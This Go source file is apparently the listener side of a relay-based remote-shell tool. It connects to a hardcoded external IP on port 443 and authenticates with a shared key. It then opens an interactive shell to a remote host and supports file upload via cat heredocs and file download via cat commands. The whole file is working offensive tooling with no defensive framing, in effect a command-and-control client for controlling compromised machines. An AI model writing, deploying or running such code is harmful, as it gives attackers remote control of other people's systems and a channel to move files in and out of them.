// === gs-listener.go ===
package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
)

const (
	relayHost = "154.18.239.136:443"
	sharedKey = "<SHARED_KEY_PLACEHOLDER>"
)

func main() {
	conn, err := net.Dial("tcp", relayHost)
	if err != nil {
		fmt.Println("Connection failed:", err)
		os.Exit(1)
	}
	fmt.Fprintf(conn, "ROLE:listener\n")
	fmt.Fprintf(conn, "KEY:%s\n", sharedKey)
	fmt.Println("[+] Connected. Interactive shell opened.")

	go io.Copy(os.Stdout, conn)
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		text := scanner.Text()
		if strings.HasPrefix(text, "upload ") {
			filename := strings.TrimSpace(strings.TrimPrefix(text, "upload "))
			uploadFile(conn, filename)
		} else if strings.HasPrefix(text, "download ") {
			filename := strings.TrimSpace(strings.TrimPrefix(text, "download "))
			fmt.Fprintf(conn, "cat %s\n", filename)
		} else {
			fmt.Fprintf(conn, "%s\n", text)
		}
	}
}

func uploadFile(conn net.Conn, filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Failed to open file: %s\n", err)
		return
	}
	defer file.Close()
	fmt.Fprintf(conn, "cat > %s <<'EOF'\n", filename)
	io.Copy(conn, file)
	fmt.Fprintf(conn, "\nEOF\n")
}
